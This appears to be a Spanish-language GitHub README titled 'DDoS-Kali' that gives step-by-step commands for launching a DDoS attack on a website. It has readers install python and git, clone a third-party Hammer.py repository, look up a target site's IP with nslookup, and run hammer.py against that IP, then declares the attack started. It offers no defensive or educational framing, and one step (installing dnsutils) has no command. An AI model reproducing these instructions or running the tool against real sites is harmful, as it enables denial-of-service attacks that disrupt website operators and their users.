# DDoS-Kali
DDoS Repositorio Hammer.Py


Hammer - Herramienta Para Tirarle Ataques de DDoS A Una Pagina Web, Nsecesitas la ip numerica de la pagina 

Primero Actualizaremos Los Repositorios!

apt update

apt upgrade 

ahora instalaremos el python (Si ya Tienes instalado Salta este Paso)

apt install python

despues instalaremos el git clone (si ya lo tienes salta este paso)

apt install git

ahora instalaremos el dnsutils (si ya lo tienes salta este paso)

ahora instalaremos el repositorio

git clone https://github.com/Pavithran-R/Hammer/

ahora tienes que revisar la ip numerica de la pagina 

nslookup Ejemplo.com

Ahora Copiamos la ip numerica

accederemos ala Carpeta Hammer

cd Hammer

python hammer.py -s (Ip Numerica) -t 135

Ejemplo:python hammer.py -s 123.45.67.89 -t 135

El Ataque De DDoS Habra Iniciado!
